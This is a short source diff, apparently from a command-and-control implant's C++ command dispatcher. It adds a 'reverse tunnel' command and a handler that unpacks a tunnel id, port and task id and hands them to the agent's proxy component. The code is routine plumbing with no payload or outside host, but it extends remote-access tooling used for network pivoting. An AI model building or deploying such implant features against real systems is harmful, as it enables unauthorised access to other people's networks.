@@ -86,6 +86,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_TUNNEL_CLOSE:
 			this->CmdTunnelMsgClose(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_TUNNEL_REVERSE:
+			this->CmdTunnelMsgReverse(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
 
@@ -783,6 +786,14 @@ void Commander::CmdTunnelMsgClose(ULONG commandId, Packer* inPacker, Packer* out
 {
 	ULONG channelId = inPacker->Unpack32();
 	this->agent->proxyfire->ConnectClose(channelId);
+}
+
+void Commander::CmdTunnelMsgReverse(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG tunnelId = inPacker->Unpack32();
+	WORD  port     = inPacker->Unpack32();
+	ULONG taskId   = inPacker->Unpack32();
+	this->agent->proxyfire->ConnectMessageReverse(tunnelId, port, outPacker);
 }
 
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
